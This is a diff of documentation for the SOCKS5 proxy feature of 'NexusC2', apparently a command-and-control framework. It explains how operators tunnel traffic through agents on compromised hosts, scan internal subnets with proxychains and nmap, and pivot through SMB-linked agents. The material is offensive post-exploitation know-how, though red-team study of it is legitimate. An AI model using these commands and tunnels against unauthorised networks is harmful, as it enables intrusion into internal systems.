@@ -2,23 +2,58 @@
 
 ## Overview
 
-NexusC2 provides SOCKS5 proxy capability that tunnels network traffic through deployed agents. This enables operators to route traffic through compromised hosts, accessing internal network resources that aren't directly reachable from the C2 server.
+NexusC2 provides two SOCKS5 proxy implementations for routing traffic through deployed agents:
 
-**Key Features:**
-- SSH-over-WebSocket tunnel for reliability
-- SOCKS5 protocol compliance
-- Two-layer authentication (SOCKS5 + SSH)
-- Connection pooling and limits
-- Stale connection cleanup
-- Dynamic keepalive based on agent callback rate
+| Command | Transport | Latency | Linked Agent Support | Use Case |
+|---------|-----------|---------|---------------------|----------|
+| **socks-ws** | WebSocket | Low (real-time) | No | Direct agents, interactive sessions |
+| **socks-http** | HTTP Polling | Higher (polling-based) | Yes | Linked agents, SMB/TCP chains |
+
+Both implementations enable operators to route traffic through compromised hosts, accessing internal network resources that aren't directly reachable from the C2 server.
 
 **Platforms:** All (Windows, Linux, macOS)
 
 ---
 
-## Architecture
+## Choosing Between socks-ws and socks-http
 
-{{< mermaid >}}
+### socks-ws (WebSocket-based)
+
+**Pros:**
+- Real-time, low-latency data transfer
+- Dedicated WebSocket connection for optimal throughput
+- Better for interactive sessions (SSH, RDP, browsing)
+- Full SOCKS5 protocol support
+
+**Cons:**
+- Requires agent to make outbound WebSocket connection
+- Does NOT work through linked agents (SMB/TCP)
+- Only works with direct HTTPS agents
+
+**Best for:** Direct agents when you need responsive, interactive tunneling.
+
+### socks-http (HTTP Polling-based)
+
+**Pros:**
+- Works through linked agent chains (SMB, TCP)
+- No additional outbound connections from agent
+- Uses existing C2 HTTP polling channel
+- Supports UDP ASSOCIATE for DNS tunneling
+
+**Cons:**
+- Higher latency (depends on agent sleep interval)
+- Best used with lower sleep values (e.g., `sleep 5`)
+- Not ideal for real-time interactive sessions
+
+**Best for:** Linked agents, pivoting through internal networks, or when WebSocket connections aren't possible.
+
+---
+
+## socks-ws (WebSocket SOCKS)
+
+### Architecture
+
+```
 flowchart LR
     subgraph Operator["Operator Workstation"]
         TOOL[Operator Tool<br/>nmap, curl, etc.]
@@ -45,20 +80,26 @@ flowchart LR
     TOOL -->|SOCKS5| SOCKS
     SSH_SRV <-->|SSH-over-WSS| WSS
     SSH_CLI -->|TCP| RES
-{{< /mermaid >}}
+```
 
----
+**Key Features:**
+- SSH-over-WebSocket tunnel for reliability
+- SOCKS5 protocol compliance
+- Two-layer authentication (SOCKS5 + SSH)
+- Connection pooling and limits
+- Stale connection cleanup
+- Dynamic keepalive based on agent callback rate
 
-## Communication Flow
+### Communication Flow
 
-### Connection Establishment
+#### Connection Establishment
 
 ```
 1. Operator starts SOCKS proxy on agent
    → Server creates SOCKS5 listener + SSH server
    → Server generates credentials
 
-2. Agent receives socks command
+2. Agent receives socks-ws command
    → Agent connects via WebSocket (wss://server:port/path)
    → Agent performs SSH handshake as client
    → Tunnel is established
@@ -68,7 +109,7 @@ flowchart LR
    → Server authenticates SOCKS connection
 ```
 
-### Data Forwarding
+#### Data Forwarding
 
 ```
 1. Tool sends SOCKS5 CONNECT request
@@ -83,9 +124,268 @@ flowchart LR
    ← Tool → Server → SSH Channel → Agent → Target →
 ```
 
+### Usage
+
+#### Start Proxy
+
+```
+socks-ws start 1080 https://domain.com/some/path 443
+```
+
+#### Use with proxychains
+
+```bash
+# /etc/proxychains.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+
+# Run commands through proxy
+proxychains nmap -sT 192.168.1.0/24
+proxychains curl http://internal-server/
+```
+
+#### Stop Proxy
+
+```
+socks-ws stop 1080
+```
+
+### Configuration
+
+| Parameter | Server Default | Agent Default |
+|-----------|---------------|---------------|
+| SOCKS Port | User-specified | N/A |
+| WebSocket Port | 3131 | 3131 |
+| Max Connections | N/A | 50 |
+| Idle Timeout | 10 minutes | 5 minutes |
+| Buffer Size | 32 KB | 32 KB |
+| Keepalive | N/A | Dynamic (10s-2min) |
+| Stale Cleanup | N/A | 30 seconds |
+
+### Limitations
+
+| Limitation | Description |
+|------------|-------------|
+| UDP | UDP ASSOCIATE not supported (use socks-http for UDP) |
+| Concurrent | Max 50 concurrent tunnels per agent |
+| Linked Agents | Does NOT work through SMB/TCP linked agents |
+| Authentication | No SOCKS5 user auth (SSH handles auth) |
+
+---
+
+## socks-http (HTTP Polling SOCKS)
+
+### Architecture
+
+```
+flowchart LR
+    subgraph Operator["Operator Workstation"]
+        TOOL[Operator Tool<br/>nmap, curl, etc.]
+    end
+
+    subgraph Server["NexusC2 Server"]
+        direction TB
+        SOCKS[SOCKS5 Listener<br/>0.0.0.0:PORT]
+        QUEUE[Command Queue]
+        SOCKS --> QUEUE
+    end
+
+    subgraph Agent["Direct/Linked Agent"]
+        direction TB
+        POLL[HTTP Polling]
+        HANDLER[SOCKS Handler]
+        POLL --> HANDLER
+    end
+
+    subgraph Target["Internal Network"]
+        RES[Target Resource<br/>internal host:port]
+    end
+
+    TOOL -->|SOCKS5| SOCKS
+    QUEUE <-->|HTTP POST/GET| POLL
+    HANDLER -->|TCP/UDP| RES
+```
+
+**Key Features:**
+- Uses existing HTTP polling channel
+- Works through linked agent chains (SMB, TCP)
+- Full SOCKS5 support including UDP ASSOCIATE
+- Session-based connection management
+- Automatic cleanup of stale sessions
+
+### Communication Flow
+
+#### Session Management
+
+```
+1. Operator starts socks-http on agent
+   → Server creates SOCKS5 listener
+   → Listener ready for incoming connections
+
+2. Tool connects to SOCKS5 listener
+   → Server creates session with unique ID
+   → Server queues "connect" command to agent
+
+3. Agent polls and receives command
+   → Agent connects to target
+   → Agent sends response via POST
+
+4. Server receives response
+   → Server signals success to SOCKS5 client
+   → Bidirectional relay begins via polling
+```
+
+#### TCP CONNECT Flow
+
+```
+Server → Agent (queued command):
+{
+  "action": "connect",
+  "session_id": "abc123",
+  "destination": "192.168.1.100:80"
+}
+
+Agent → Server (POST response):
+{
+  "session_id": "abc123",
+  "status": "connected"
+}
+
+Data transfer via "data" actions...
+
+Cleanup via "close" action when done
+```
+
+#### UDP ASSOCIATE Flow (for DNS, etc.)
+
+```
+Server → Agent (queued command):
+{
+  "action": "udp_associate",
+  "session_id": "def456"
+}
+
+Agent → Server (POST response):
+{
+  "session_id": "def456",
+  "status": "udp_ready"
+}
+
+UDP data packets via "udp_data" actions...
+```
+
+### Usage
+
+#### Start Proxy
+
+```
+socks-http start 1080
+```
+
+#### Optimize for Latency
+
+For better responsiveness, reduce the agent sleep interval:
+
+```
+sleep 5          # 5 second check-in for responsive proxying
+socks-http start 1080
+```
+
+#### Use with proxychains
+
+```bash
+# /etc/proxychains.conf
+[ProxyList]
+socks5 127.0.0.1 1080
+
+# Run commands through proxy
+proxychains nmap -sT 192.168.1.0/24
+proxychains curl http://internal-server/
+
+# DNS through SOCKS (UDP ASSOCIATE)
+proxychains dig @8.8.8.8 example.com
+```
+
+#### Use with Linked Agents
+
+socks-http is the only SOCKS option that works through linked agents:
+
+```
+# On your edge agent, link to internal agent
+link smb 192.168.1.50 spoolss
+
+# Switch to the linked agent
+# Start SOCKS proxy on the linked agent
+socks-http start 1080
+
+# Traffic now routes through:
+# Tool → Server → Edge Agent → SMB Link → Internal Agent → Target
+```
+
+#### Stop Proxy
+
+```
+socks-http stop 1080
+```
+
+### Configuration
+
+| Parameter | Default | Description |
+|-----------|---------|-------------|
+| Session Timeout | 5 minutes | Inactive session cleanup |
+| Max Sessions | Unlimited | No hard limit on concurrent sessions |
+| Buffer Size | 64 KB | Data chunk size for transfer |
+| Cleanup Interval | 60 seconds | How often stale sessions are cleaned |
+
+### Supported SOCKS5 Commands
+
+| Command | Support | Description |
+|---------|---------|-------------|
+| CONNECT (0x01) | Full | TCP connection to target |
+| BIND (0x02) | No | Not implemented |
+| UDP ASSOCIATE (0x03) | Full | UDP relay for DNS, etc. |
+
+### Limitations
+
+| Limitation | Description |
+|------------|-------------|
+| Latency | Higher than socks-ws due to polling |
+| Throughput | Limited by polling frequency |
+| Interactive | Not ideal for SSH/RDP (use socks-ws) |
+
 ---
 
 ## Server-Side Components
+
+### socks-ws Components
+
+| Component | File Path |
+|-----------|-----------|
+| Server SOCKS | `server/internal/agent/socks/socks_server.go` |
+| Server Bridge | `server/internal/agent/socks/socks_bridge.go` |
+| Server Handler | `server/internal/agent/handlers/socks_handler.go` |
+| WebSocket Handler | `server/internal/websocket/handlers/socks.go` |
+
+### socks-http Components
+
+| Component | File Path |
+|-----------|-----------|
+| Server | `server/internal/agent/socks_http/server.go` |
+| WebSocket Handler | `server/internal/websocket/handlers/socks_http.go` |
+
+### Agent Components
+
+| Platform | socks-ws | socks-http |
+|----------|----------|------------|
+| Linux | `payloads/Linux/action_socks.go` | `payloads/Linux/action_socks_http.go` |
+| Windows | `payloads/Windows/action_socks.go` | `payloads/Windows/action_socks_http.go` |
+| macOS | `payloads/Darwin/action_socks.go` | `payloads/Darwin/action_socks_http.go` |
+| TCP Link | N/A | `payloads/TCP_*/action_socks_http.go` |
+| SMB Link | N/A | `payloads/SMB_Windows/action_socks_http.go` |
+
+---
+
+## Technical Details (socks-ws)
 
 ### SOCKS5 Listener
 
@@ -99,30 +399,6 @@ type Server struct {
     sshConn       *ssh.ServerConn
     sshChannels   <-chan ssh.NewChannel
     forwardChan   chan *ForwardRequest
-}
-```
-
-### SOCKS5 Authentication
-
-The server accepts connections without user authentication (handled at SSH layer):
-
-```go
-func (s *Server) handleSocksAuth(conn net.Conn) error {
-    // Read SOCKS5 version and methods
-    buf := make([]byte, 2)
-    io.ReadFull(conn, buf)
-
-    if buf[0] != 0x05 {
-        return fmt.Errorf("unsupported SOCKS version")
-    }
-
-    // Read methods offered
-    methods := make([]byte, buf[1])
-    io.ReadFull(conn, methods)
-
-    // Accept no authentication (0x00)
-    conn.Write([]byte{0x05, 0x00})
-    return nil
 }
 ```
 
@@ -145,36 +421,7 @@ hostKey, _ := generateHostKey()
 config.AddHostKey(hostKey)
 ```
 
-### Forwarding Mechanism
-
-When a SOCKS connection requests a target, the server opens an SSH channel:
-
-```go
-func (s *Server) handleTunnelForwarding(clientConn net.Conn, target string) {
-    // Open direct-tcpip channel to agent
-    channel, reqs, _ := sshConn.OpenChannel("direct-tcpip", ssh.Marshal(&struct {
-        DestAddr   string
-        DestPort   uint32
-        OriginAddr string
-        OriginPort uint32
-    }{
-        DestAddr:   target,
-        DestPort:   0,
-        OriginAddr: "127.0.0.1",
-        OriginPort: 0,
-    }))
-
-    // Bridge client connection and SSH channel
-    go io.Copy(channel, clientConn)    // Client → Target
-    go io.Copy(clientConn, channel)    // Target → Client
-}
-```
-
----
-
-## Agent-Side Components
-
-### WebSocket Connection
+### Agent WebSocket Connection
 
 The agent connects to the server via secure WebSocket:
 
@@ -191,138 +438,7 @@ wsURL := fmt.Sprintf("wss://%s:%d%s", host, port, path)
 wsConn, _, _ := dialer.Dial(wsURL, nil)
 ```
 
-### SSH Client
-
-The agent acts as an SSH client over the WebSocket:
-
-```go
-sshConfig := &ssh.ClientConfig{
-    User: credentials.Username,
-    Auth: []ssh.AuthMethod{
-        ssh.Password(credentials.Password),
-    },
-    HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-    Timeout:         10 * time.Second,
-}
-
-// Wrap WebSocket in net.Conn interface
-wrapped := &wsConnWrapper{conn: wsConn}
-sshConn, chans, reqs, _ := ssh.NewClientConn(wrapped, "", sshConfig)
-```
-
-### Channel Handler
-
-The agent handles channel open requests (direct-tcpip):
-
-```go
-func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
-    if newChannel.ChannelType() != "direct-tcpip" {
-        newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
-        return
-    }
-
-    // Parse forwarding request
-    var req struct {
-        DestAddr   string
-        DestPort   uint32
-        OriginAddr string
-        OriginPort uint32
-    }
-    ssh.Unmarshal(newChannel.ExtraData(), &req)
-
-    // Connect to target
-    target := req.DestAddr
-    targetConn, _ := net.DialTimeout("tcp", target, 10*time.Second)
-
-    // Accept channel
-    channel, requests, _ := newChannel.Accept()
-
-    // Bridge data
-    go io.Copy(targetConn, channel)  // Channel → Target
-    go io.Copy(channel, targetConn)  // Target → Channel
-}
-```
-
----
-
-## Authentication
-
-### Two-Layer Authentication
-
-| Layer | Authentication | Purpose |
-|-------|---------------|---------|
-| SOCKS5 | None (0x00) | Protocol compliance |
-| SSH | Username + Password | Agent authentication |
-
-### Credential Generation
-
-Credentials are generated per-session:
-
-```go
-type Credentials struct {
-    Username string
-    Password string
-    SSHKey   []byte  // Optional SSH key
-}
-```
-
----
-
-## Connection Management
-
-### Connection Limits
-
-The agent enforces connection limits to prevent resource exhaustion:
-
-```go
-c.maxConnections = 50  // Maximum concurrent tunnels
-
-if c.currentConns >= c.maxConnections {
-    newChannel.Reject(ssh.ResourceShortage, "connection limit reached")
-    return
-}
-```
-
-### Tunnel Tracking
-
-Each active tunnel is tracked:
-
-```go
-type TunnelInfo struct {
-    Target       string
-    StartTime    time.Time
-    LastActivity time.Time
-    BytesSent    int64
-    BytesRecv    int64
-}
-```
-
-### Stale Connection Cleanup
-
-Idle tunnels are automatically cleaned up:
-
-```go
-func (c *SocksCommand) cleanupStaleTunnels() {
-    ticker := time.NewTicker(30 * time.Second)
-    for range ticker.C {
-        c.tunnelsMu.Lock()
-        for connID, info := range c.activeTunnels {
-            // Remove tunnels idle for more than 5 minutes
-            if time.Since(info.LastActivity) > 5*time.Minute {
-                delete(c.activeTunnels, connID)
-                c.currentConns--
-            }
-        }
-        c.tunnelsMu.Unlock()
-    }
-}
-```
-
----
-
-## Keepalive Mechanism
-
-### Dynamic Interval
+### Dynamic Keepalive
 
 Keepalive adapts to agent callback rate:
 
@@ -349,195 +465,30 @@ func (c *SocksCommand) calculateKeepaliveInterval() time.Duration {
 }
 ```
 
-### SSH Keepalive
-
-The agent sends SSH keepalive requests:
-
-```go
-func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
-    for c.running {
-        interval := c.calculateKeepaliveInterval()
-        time.Sleep(interval)
-
-        _, _, err := sshConn.SendRequest("keepalive@golang.org", true, nil)
-        if err != nil {
-            // Connection lost, trigger cleanup
-            c.running = false
-            c.wsConn.Close()
-            break
-        }
-    }
-}
-```
-
 ---
 
-## Command Configuration
+## Quick Reference
 
 ### Start SOCKS Proxy
 
-```json
-{
-  "action": "start",
-  "socks_port": 1080,
-  "wss_port": 3131,
-  "wss_host": "c2.example.com",
-  "path": "/socks/agent-uuid",
-  "credentials": {
-    "username": "generated_user",
-    "password": "generated_pass",
-    "ssh_key": "<base64 optional>"
-  }
-}
-```
+| Method | Command | Requirements |
+|--------|---------|--------------|
+| WebSocket | `socks-ws start 1080 https://host/path 443` | Direct agent, WebSocket capable |
+| HTTP | `socks-http start 1080` | Any agent (direct or linked) |
 
 ### Stop SOCKS Proxy
 
-```json
-{
-  "action": "stop"
-}
-```
+| Method | Command |
+|--------|---------|
+| WebSocket | `socks-ws stop 1080` |
+| HTTP | `socks-http stop 1080` |
 
----
+### Recommended Configurations
 
-## WebSocket Wrapper
-
-The WebSocket connection is wrapped to implement `net.Conn`:
-
-```go
-type wsConnWrapper struct {
-    conn        *websocket.Conn
-    buf         []byte
-    bufFromPool bool
-}
-
-func (w *wsConnWrapper) Read(b []byte) (n int, err error) {
-    if len(w.buf) == 0 {
-        _, message, err := w.conn.ReadMessage()
-        if err != nil {
-            return 0, err
-        }
-        w.buf = message
-    }
-    n = copy(b, w.buf)
-    w.buf = w.buf[n:]
-    return n, nil
-}
-
-func (w *wsConnWrapper) Write(b []byte) (n int, err error) {
-    err = w.conn.WriteMessage(websocket.BinaryMessage, b)
-    return len(b), err
-}
-```
-
----
-
-## Data Transfer
-
-### Buffer Pooling
-
-Memory is efficiently managed with buffer pools:
-
-```go
-var wsBufferPool = sync.Pool{
-    New: func() interface{} {
-        buf := make([]byte, 0, 32*1024) // 32KB capacity
-        return &buf
-    },
-}
-```
-
-### Timeout Handling
-
-Data copies enforce idle timeouts:
-
-```go
-func (c *SocksCommand) copyWithTimeout(dst io.Writer, src io.Reader, connID string, isSend bool) (int64, error) {
-    const idleTimeout = 5 * time.Minute
-    buf := make([]byte, 32*1024)
-
-    for {
-        if conn, ok := src.(net.Conn); ok {
-            conn.SetReadDeadline(time.Now().Add(idleTimeout))
-        }
-
-        nr, err := src.Read(buf)
-        if nr > 0 {
-            nw, ew := dst.Write(buf[0:nr])
-            // ... handle write
-        }
-        if err != nil {
-            return written, err
-        }
-    }
-}
-```
-
----
-
-## Configuration Summary
-
-| Parameter | Server Default | Agent Default |
-|-----------|---------------|---------------|
-| SOCKS Port | User-specified | N/A |
-| WebSocket Port | 3131 | 3131 |
-| Max Connections | N/A | 50 |
-| Idle Timeout | 10 minutes | 5 minutes |
-| Buffer Size | 32 KB | 32 KB |
-| Keepalive | N/A | Dynamic (10s-2min) |
-| Stale Cleanup | N/A | 30 seconds |
-
----
-
-## Usage Example
-
-### Start Proxy
-
-```
-socks start 1080
-```
-
-### Use with proxychains
-
-```bash
-# /etc/proxychains.conf
-[ProxyList]
-socks5 127.0.0.1 1080
-
-# Run commands through proxy
-proxychains nmap -sT 192.168.1.0/24
-proxychains curl http://internal-server/
-```
-
-### Stop Proxy
-
-```
-socks stop
-```
-
----
-
-## Limitations
-
-| Limitation | Description |
-|------------|-------------|
-| UDP | SOCKS5 UDP not supported |
-| Concurrent | Max 50 concurrent tunnels per agent |
-| Latency | Adds round-trip through agent |
-| Authentication | No SOCKS5 user auth (SSH handles auth) |
-| IPv6 | Supported but may have edge cases |
-
----
-
-## Related Files
-
-| Component | File Path |
-|-----------|-----------|
-| Server SOCKS | `server/internal/agent/socks/socks_server.go` |
-| Server Bridge | `server/internal/agent/socks/socks_bridge.go` |
-| Server Handler | `server/internal/agent/handlers/socks_handler.go` |
-| WebSocket Handler | `server/internal/websocket/handlers/socks.go` |
-| Agent SOCKS (Linux) | `server/docker/payloads/Linux/action_socks.go` |
-| Agent SOCKS (Windows) | `server/docker/payloads/Windows/action_socks.go` |
-| Agent SOCKS (macOS) | `server/docker/payloads/Darwin/action_socks.go` |
+| Scenario | Recommendation |
+|----------|---------------|
+| Direct agent, need speed | `socks-ws` |
+| Linked agent chain | `socks-http` |
+| DNS tunneling needed | `socks-http` (UDP support) |
+| Interactive session (SSH) | `socks-ws` |
+| Slow network scanning | Either (socks-http with lower sleep) |
